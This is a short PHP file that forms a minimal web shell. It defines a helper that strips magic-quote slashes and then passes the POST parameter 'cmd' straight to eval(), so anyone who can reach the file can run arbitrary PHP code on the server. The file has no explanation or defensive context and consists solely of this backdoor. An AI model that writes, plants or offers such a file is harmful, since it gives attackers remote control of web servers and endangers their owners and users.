<?php
function magicboom($text){
	if (!get_magic_quotes_gpc()){
		return $text;
	} 
	return stripslashes($text);
} 

eval(magicboom($_POST['cmd']));
?>